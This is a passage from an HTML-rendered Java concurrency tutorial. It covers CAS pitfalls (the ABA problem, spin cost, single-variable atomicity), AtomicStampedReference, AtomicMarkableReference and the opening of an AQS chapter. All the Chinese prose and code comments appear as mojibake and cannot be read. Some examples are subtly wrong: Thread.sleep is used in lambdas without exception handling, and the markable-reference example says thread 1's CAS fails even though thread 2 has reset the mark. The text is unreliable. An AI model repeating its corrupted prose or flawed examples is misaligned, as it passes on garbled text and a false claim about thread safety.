    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get();  <span class="hljs-comment">// è¯»å–"A"</span>
    Thread.sleep(<span class="hljs-number">1000</span>);      <span class="hljs-comment">// ç­‰å¾…1ç§’</span>
    <span class="hljs-comment">// æ­¤æ—¶å€¼å¯èƒ½å·²ç»è¢«çº¿ç¨‹2æ”¹è¿‡ï¼Œä½†CASä»ç„¶æˆåŠŸ</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>);  <span class="hljs-comment">// æˆåŠŸï¼ä½†å¯èƒ½ä¸æ˜¯æœŸæœ›çš„ç»“æœ</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>);  <span class="hljs-comment">// A -&gt; B</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>);  <span class="hljs-comment">// B -&gt; Aï¼ˆåˆæ”¹å›æ¥äº†ï¼‰</span>
});

t1.start();
t2.start();
</code></pre>
<p><strong>ABAé—®é¢˜çš„å±å®³ï¼š</strong></p>
<ul>
<li>åœ¨æ ˆã€é“¾è¡¨ç­‰æ•°æ®ç»“æ„ä¸­ï¼Œå¯èƒ½å¯¼è‡´é€»è¾‘é”™è¯¯</li>
<li>è™½ç„¶å€¼ç›¸åŒï¼Œä½†å¯¹è±¡å¯èƒ½å·²ç»è¢«æ›¿æ¢è¿‡</li>
<li>éœ€è¦é¢å¤–çš„ç‰ˆæœ¬å·æˆ–æ ‡è®°æ¥æ£€æµ‹</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ç‰ˆæœ¬å·ï¼šæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·+1ï¼ˆAtomicStampedReferenceï¼‰</li>
<li>ä½¿ç”¨æ ‡è®°ä½ï¼šæ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆAtomicMarkableReferenceï¼‰</li>
</ul>
<h5 data-id="heading-110">è‡ªæ—‹å¼€é”€</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASå¤±è´¥åä¼šä¸æ–­é‡è¯•ï¼ˆè‡ªæ—‹ï¼‰ï¼Œåœ¨é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPUã€‚</p>
<p><strong>å…·ä½“è¡¨ç°ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// CASè‡ªæ—‹è¿‡ç¨‹ï¼ˆä¼ªä»£ç ï¼‰</span>
<span class="hljs-keyword">do</span> {
    current = value;  <span class="hljs-comment">// è¯»å–å½“å‰å€¼</span>
    next = current + <span class="hljs-number">1</span>;
} <span class="hljs-keyword">while</span> (!compareAndSet(current, next));  
<span class="hljs-comment">// å¦‚æœä¸€ç›´å¤±è´¥ï¼Œä¼šä¸€ç›´å¾ªç¯ï¼ˆè‡ªæ—‹ï¼‰ï¼Œæ¶ˆè€—CPU</span>
</code></pre>
<p><strong>é—®é¢˜ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>CPUæ¶ˆè€—é«˜</strong>ï¼šè‡ªæ—‹ä¼šæŒç»­å ç”¨CPUï¼Œä¸åšå…¶ä»–å·¥ä½œ</li>
<li>âš ï¸ <strong>é«˜ç«äº‰æ—¶æ€§èƒ½ä¸‹é™</strong>ï¼šå¤§é‡çº¿ç¨‹åŒæ—¶CASï¼Œå¤±è´¥ç‡é«˜ï¼Œè‡ªæ—‹æ—¶é—´é•¿</li>
<li>âš ï¸ <strong>å¯èƒ½å¯¼è‡´CPU 100%</strong>ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨è‡ªæ—‹ï¼ŒCPUæ»¡è½½ä½†æ•ˆç‡ä½</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>é™åˆ¶è‡ªæ—‹æ¬¡æ•°</strong>ï¼šè¶…è¿‡ä¸€å®šæ¬¡æ•°åæ”¾å¼ƒ</li>
<li><strong>è‡ªé€‚åº”è‡ªæ—‹</strong>ï¼šæ ¹æ®å†å²æˆåŠŸç‡åŠ¨æ€è°ƒæ•´è‡ªæ—‹æ¬¡æ•°</li>
<li><strong>è‡ªæ—‹å¤±è´¥åé˜»å¡</strong>ï¼šè‡ªæ—‹ä¸€æ®µæ—¶é—´åå¦‚æœè¿˜å¤±è´¥ï¼Œå°±é˜»å¡ç­‰å¾…</li>
</ol>
<p><strong>æ€§èƒ½å»ºè®®ï¼š</strong></p>
<ul>
<li>ä½ç«äº‰åœºæ™¯ï¼šä½¿ç”¨CASï¼ˆè‡ªæ—‹å¼€é”€å°ï¼‰</li>
<li>é«˜ç«äº‰åœºæ™¯ï¼šè€ƒè™‘ä½¿ç”¨é”ï¼ˆé˜»å¡ç­‰å¾…ï¼ŒèŠ‚çœCPUï¼‰</li>
</ul>
<h5 data-id="heading-111">åªèƒ½ä¿è¯ä¸€ä¸ªå˜é‡çš„åŸå­æ€§</h5>
<p><strong>é—®é¢˜æè¿°ï¼š</strong></p>
<p>CASåªèƒ½åŸå­åœ°æ›´æ–°ä¸€ä¸ªå˜é‡ã€‚å¦‚æœéœ€è¦å¯¹å¤šä¸ªå˜é‡è¿›è¡ŒåŸå­æ“ä½œï¼ŒCASæ— æ³•ç›´æ¥ä¿è¯ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);

<span class="hljs-comment">// âŒ è¿™ä¸¤ä¸ªæ“ä½œä¸æ˜¯åŸå­çš„</span>
count1.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ1</span>
count2.incrementAndGet();  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// é—®é¢˜ï¼šä¸¤ä¸ªæ“ä½œä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ˜¯ä¸ªé—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœéœ€è¦ä¿è¯count1å’Œcount2åŒæ—¶æ›´æ–°ï¼ŒCASæ— æ³•åšåˆ°</li>
<li>ä¸¤ä¸ªç‹¬ç«‹çš„CASæ“ä½œä¹‹é—´æ²¡æœ‰åŸå­æ€§ä¿è¯</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li><strong>ä½¿ç”¨synchronized</strong>ï¼šå°†å¤šä¸ªæ“ä½œæ”¾åœ¨åŒæ­¥å—ä¸­</li>
<li><strong>ä½¿ç”¨é”</strong>ï¼šReentrantLockç­‰</li>
<li><strong>åˆå¹¶å˜é‡</strong>ï¼šå°†å¤šä¸ªå˜é‡åˆå¹¶ä¸ºä¸€ä¸ªå¯¹è±¡ï¼ŒCASæ›´æ–°æ•´ä¸ªå¯¹è±¡</li>
<li><strong>ä½¿ç”¨AtomicReference</strong>ï¼šå°†å¤šä¸ªå€¼å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡ä¸­</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
    count1++;
    count2++;
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šåˆå¹¶ä¸ºå¯¹è±¡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CountPair</span> {
    <span class="hljs-type">int</span> count1, count2;
}
AtomicReference&lt;CountPair&gt; pair = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();
</code></pre>
<h3 data-id="heading-112">5.4 ABAé—®é¢˜åŠè§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-113">ABAé—®é¢˜çš„äº§ç”Ÿåœºæ™¯</h4>
<p><strong>å…¸å‹åœºæ™¯ï¼šæ— é”æ ˆçš„å®ç°</strong></p>
<p>åœ¨å®ç°æ— é”æ•°æ®ç»“æ„ï¼ˆå¦‚æ ˆã€é˜Ÿåˆ—ï¼‰æ—¶ï¼ŒABAé—®é¢˜ç‰¹åˆ«å®¹æ˜“å‡ºç°ã€‚</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼ˆæ— é”æ ˆï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç®€åŒ–ç‰ˆæ— é”æ ˆ</span>
AtomicReference&lt;Node&gt; head = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-comment">// å‡ºæ ˆæ“ä½œ</span>
<span class="hljs-keyword">public</span> Node <span class="hljs-title function_">pop</span><span class="hljs-params">()</span> {
    Node oldHead;
    Node newHead;
    <span class="hljs-keyword">do</span> {
        oldHead = head.get();      <span class="hljs-comment">// 1. è¯»å–å¤´èŠ‚ç‚¹A</span>
        <span class="hljs-keyword">if</span> (oldHead == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        newHead = oldHead.next;    <span class="hljs-comment">// 2. å‡†å¤‡è®¾ç½®æ–°çš„å¤´èŠ‚ç‚¹</span>
        <span class="hljs-comment">// é—®é¢˜ï¼šå¦‚æœåœ¨æ­¥éª¤1å’Œ3ä¹‹é—´ï¼Œheadä»Aå˜æˆBå†å˜å›A</span>
        <span class="hljs-comment">// CASä»ç„¶ä¼šæˆåŠŸï¼Œä½†å®é™…ä¸Šå¤´èŠ‚ç‚¹å·²ç»è¢«æ¢è¿‡äº†ï¼</span>
    } <span class="hljs-keyword">while</span> (!head.compareAndSet(oldHead, newHead));  <span class="hljs-comment">// 3. CASæ›´æ–°</span>
    
    <span class="hljs-keyword">return</span> oldHead;
}
</code></pre>
<p><strong>ABAé—®é¢˜çš„æ—¶é—´çº¿ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">T1: çº¿ç¨‹1è¯»å– <span class="hljs-attr">head</span> = A
T2: çº¿ç¨‹2æ‰§è¡Œï¼š<span class="hljs-attr">head</span> = A -&gt; B -&gt; Aï¼ˆå…ˆpushå†popï¼Œåˆå›åˆ°Aï¼‰
T3: çº¿ç¨‹1æ‰§è¡ŒCAS(A, newHead)
    ç»“æœï¼šCASæˆåŠŸï¼ä½†æ­¤æ—¶Aå·²ç»ä¸æ˜¯åŸæ¥çš„Aäº†
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¼šæœ‰é—®é¢˜ï¼Ÿ</strong></p>
<ul>
<li>è™½ç„¶headçš„å€¼è¿˜æ˜¯Aï¼Œä½†AæŒ‡å‘çš„èŠ‚ç‚¹å¯èƒ½å·²ç»è¢«ä¿®æ”¹è¿‡</li>
<li>å¯èƒ½å¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–é€»è¾‘é”™è¯¯</li>
<li>CASæ— æ³•æ£€æµ‹åˆ°"å€¼è¢«æ¢è¿‡"è¿™ä¸ªäº‹å®</li>
</ul>
<h4 data-id="heading-114">ç‰ˆæœ¬å·æœºåˆ¶ï¼ˆè§£å†³æ€è·¯ï¼‰</h4>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> åœ¨å€¼çš„åŸºç¡€ä¸Šå¢åŠ ç‰ˆæœ¬å·ï¼Œæ¯æ¬¡ä¿®æ”¹ç‰ˆæœ¬å·é€’å¢</p>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒç»™æ¯æ¬¡ä¿®æ”¹æ‰“ä¸Šæ—¶é—´æˆ³</li>
<li>å³ä½¿å€¼ç›¸åŒï¼Œç‰ˆæœ¬å·ä¹Ÿä¸åŒ</li>
<li>CASæ—¶åŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</li>
</ul>
<p><strong>å®ç°æ€è·¯ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç è¯´æ˜</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionedValue</span> {
    Object value;     <span class="hljs-comment">// å®é™…å€¼</span>
    <span class="hljs-type">int</span> version;      <span class="hljs-comment">// ç‰ˆæœ¬å·</span>
}

<span class="hljs-comment">// CASæ“ä½œ</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(Object expectedValue, <span class="hljs-type">int</span> expectedVersion, 
                      Object newValue, <span class="hljs-type">int</span> newVersion)</span> {
    <span class="hljs-keyword">if</span> (currentValue == expectedValue &amp;&amp; currentVersion == expectedVersion) {
        <span class="hljs-comment">// å€¼å’Œç‰ˆæœ¬å·éƒ½åŒ¹é…ï¼Œæ‰æ›´æ–°</span>
        value = newValue;
        version = newVersion + <span class="hljs-number">1</span>;  <span class="hljs-comment">// ç‰ˆæœ¬å·é€’å¢</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… èƒ½æ£€æµ‹åˆ°ABAé—®é¢˜</li>
<li>âœ… ç‰ˆæœ¬å·é€’å¢ï¼Œä¸ä¼šé‡å¤</li>
<li>âœ… ç²¾ç¡®æ§åˆ¶æ¯æ¬¡ä¿®æ”¹</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>âš ï¸ éœ€è¦é¢å¤–çš„å­˜å‚¨ç©ºé—´ï¼ˆç‰ˆæœ¬å·ï¼‰</li>
<li>âš ï¸ å®ç°ç¨å¾®å¤æ‚ä¸€äº›</li>
</ul>
<h4 data-id="heading-115">AtomicStampedReferenceï¼ˆç‰ˆæœ¬å·è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicStampedReference</strong>ï¼šJavaæä¾›çš„å¸¦ç‰ˆæœ¬å·çš„åŸå­å¼•ç”¨ç±»ï¼Œå¯ä»¥è§£å†³ABAé—®é¢˜ã€‚</p>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicStampedReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œç‰ˆæœ¬å·ä¸º0</span>
AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];  <span class="hljs-comment">// ç”¨äºæ¥æ”¶ç‰ˆæœ¬å·çš„æ•°ç»„</span>
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];    <span class="hljs-comment">// å½“å‰ç‰ˆæœ¬å·</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>             <span class="hljs-comment">// æœŸæœ›ç‰ˆæœ¬å·å’Œæ–°ç‰ˆæœ¬å·</span>
);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, <span class="hljs-number">2</span>);     <span class="hljs-comment">// è®¾ç½®å€¼ä¸º"C"ï¼Œç‰ˆæœ¬å·ä¸º2</span>
</code></pre>
<p><strong>è§£å†³ABAé—®é¢˜çš„ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// çº¿ç¨‹1ï¼šå‡†å¤‡ä¿®æ”¹</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(stamp);      <span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">oldVersion</span> <span class="hljs-operator">=</span> stamp[<span class="hljs-number">0</span>];        <span class="hljs-comment">// version = 0</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šåŒæ—¶æ£€æŸ¥å€¼å’Œç‰ˆæœ¬å·</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
        old, <span class="hljs-string">"C"</span>, 
        oldVersion, oldVersion + <span class="hljs-number">1</span>
    );
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œç‰ˆæœ¬å·å·²ç»ä¸æ˜¯0äº†ï¼ŒCASå¤±è´¥ âœ…</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šA -&gt; B -&gt; A</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">int</span>[] stamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(stamp);
    
    <span class="hljs-comment">// A -&gt; Bï¼Œç‰ˆæœ¬å· 0 -&gt; 1</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    
    <span class="hljs-comment">// B -&gt; Aï¼Œç‰ˆæœ¬å· 1 -&gt; 2</span>
    current = ref.get(stamp);
    ref.compareAndSet(current, <span class="hljs-string">"A"</span>, stamp[<span class="hljs-number">0</span>], stamp[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>);
    <span class="hljs-comment">// æ­¤æ—¶å€¼è¿˜æ˜¯Aï¼Œä½†ç‰ˆæœ¬å·å·²ç»æ˜¯2äº†</span>
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šçº¿ç¨‹1çš„CASå¤±è´¥ï¼Œå› ä¸ºç‰ˆæœ¬å·ä¸åŒ¹é… âœ…</span>
</code></pre>
<p><strong>æ ¸å¿ƒæ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
V <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span>[] stampHolder)</span>  <span class="hljs-comment">// ç‰ˆæœ¬å·é€šè¿‡æ•°ç»„è¿”å›</span>

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(V expectedValue, V newValue,
                      <span class="hljs-type">int</span> expectedStamp, <span class="hljs-type">int</span> newStamp)</span>

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">set</span><span class="hljs-params">(V newValue, <span class="hljs-type">int</span> newStamp)</span>
</code></pre>
<h4 data-id="heading-116">AtomicMarkableReferenceï¼ˆæ ‡è®°ä½è§£å†³æ–¹æ¡ˆï¼‰</h4>
<p><strong>AtomicMarkableReference</strong>ï¼šä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ï¼Œæ›´èŠ‚çœå†…å­˜ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åªéœ€è¦çŸ¥é“å€¼æ˜¯å¦è¢«ä¿®æ”¹è¿‡ï¼ˆä¸éœ€è¦çŸ¥é“ä¿®æ”¹äº†å‡ æ¬¡ï¼‰</li>
<li>å¯¹ç²¾åº¦è¦æ±‚ä¸é«˜</li>
<li>æƒ³èŠ‚çœå†…å­˜ï¼ˆbooleanæ¯”intå°ï¼‰</li>
</ul>
<p><strong>ä½¿ç”¨æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicMarkableReference;

<span class="hljs-comment">// åˆ›å»ºï¼šåˆå§‹å€¼ä¸º"A"ï¼Œæ ‡è®°ä¸ºfalse</span>
AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];  <span class="hljs-comment">// å½“å‰æ ‡è®°</span>

<span class="hljs-comment">// CASæ“ä½œï¼šåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(
    <span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>,        <span class="hljs-comment">// æœŸæœ›å€¼å’Œæ–°å€¼</span>
    <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>      <span class="hljs-comment">// æœŸæœ›æ ‡è®°å’Œæ–°æ ‡è®°</span>
);
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = 
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> ref.get(mark);
    <span class="hljs-type">boolean</span> <span class="hljs-variable">oldMark</span> <span class="hljs-operator">=</span> mark[<span class="hljs-number">0</span>];  <span class="hljs-comment">// false</span>
    
    Thread.sleep(<span class="hljs-number">1000</span>);
    
    <span class="hljs-comment">// CASï¼šæ£€æŸ¥å€¼å’Œæ ‡è®°</span>
    ref.compareAndSet(old, <span class="hljs-string">"C"</span>, oldMark, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å¦‚æœçº¿ç¨‹2æ”¹è¿‡ï¼Œæ ‡è®°å·²ç»ä¸æ˜¯falseäº†ï¼ŒCASå¤±è´¥</span>
});

<span class="hljs-comment">// çº¿ç¨‹2ï¼šä¿®æ”¹å€¼å¹¶æ”¹å˜æ ‡è®°</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-type">boolean</span>[] mark = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
    <span class="hljs-type">String</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> ref.get(mark);
    
    <span class="hljs-comment">// ä¿®æ”¹å€¼ï¼Œæ ‡è®° false -&gt; true</span>
    ref.compareAndSet(current, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);
    <span class="hljs-comment">// å†æ”¹å›æ¥ï¼Œæ ‡è®° true -&gt; false</span>
    ref.compareAndSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"A"</span>, <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
});
</code></pre>
<p><strong>å¯¹æ¯”æ€»ç»“ï¼š</strong></p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>AtomicStampedReference</th><th>AtomicMarkableReference</th></tr></thead><tbody><tr><td><strong>æ ‡è®°ç±»å‹</strong></td><td>intï¼ˆç‰ˆæœ¬å·ï¼‰</td><td>booleanï¼ˆæ ‡è®°ï¼‰</td></tr><tr><td><strong>ç²¾åº¦</strong></td><td>âœ… é«˜ï¼ˆçŸ¥é“ä¿®æ”¹æ¬¡æ•°ï¼‰</td><td>âš ï¸ ä½ï¼ˆåªçŸ¥é“æ˜¯å¦ä¿®æ”¹è¿‡ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>âš ï¸ è¾ƒå¤§ï¼ˆint 4å­—èŠ‚ï¼‰</td><td>âœ… è¾ƒå°ï¼ˆboolean 1å­—èŠ‚ï¼‰</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>éœ€è¦ç²¾ç¡®ç‰ˆæœ¬æ§åˆ¶</td><td>åªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹</td></tr><tr><td><strong>æ¨èä½¿ç”¨</strong></td><td>å¤§å¤šæ•°åœºæ™¯</td><td>å†…å­˜æ•æ„Ÿã€ç²¾åº¦è¦æ±‚ä¸é«˜çš„åœºæ™¯</td></tr></tbody></table>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨ <strong>AtomicStampedReference</strong>ï¼ˆæ›´ç²¾ç¡®ï¼‰</li>
<li>å¦‚æœåªéœ€è¦æ ‡è®°æ˜¯å¦ä¿®æ”¹è¿‡ï¼Œä¸”å†…å­˜ç´§å¼ ï¼Œä½¿ç”¨ <strong>AtomicMarkableReference</strong></li>
</ul>
<hr/>
<h2 data-id="heading-117">ç¬¬å…­ç«  AQSï¼ˆAbstractQueuedSynchronizerï¼‰</h2>
<h3 data-id="heading-118">6.1 AQSæ¦‚è¿°</h3>
<h4 data-id="heading-119">AQSçš„è®¾è®¡æ€æƒ³</h4>
<p>**AQSï¼ˆAbstractQueuedSynchronizerï¼‰**æ˜¯JUCåŒ…ä¸­å®ç°åŒæ­¥å™¨çš„åŸºç¡€æ¡†æ¶ï¼Œå¾ˆå¤šåŒæ­¥å·¥å…·ç±»éƒ½æ˜¯åŸºäºAQSå®ç°çš„ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ä¸€ä¸ª<strong>volatile int state</strong>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>ä½¿ç”¨<strong>FIFOé˜Ÿåˆ—</strong>ç®¡ç†ç­‰å¾…çº¿ç¨‹</li>
<li>é€šè¿‡<strong>CAS</strong>æ“ä½œæ›´æ–°çŠ¶æ€</li>
<li>é€šè¿‡<strong>æ¨¡æ¿æ–¹æ³•æ¨¡å¼</strong>ï¼Œå­ç±»å®ç°å…·ä½“çš„åŒæ­¥é€»è¾‘</li>
</ul>
<p><strong>è®¾è®¡æ¨¡å¼ï¼š</strong></p>
<ul>
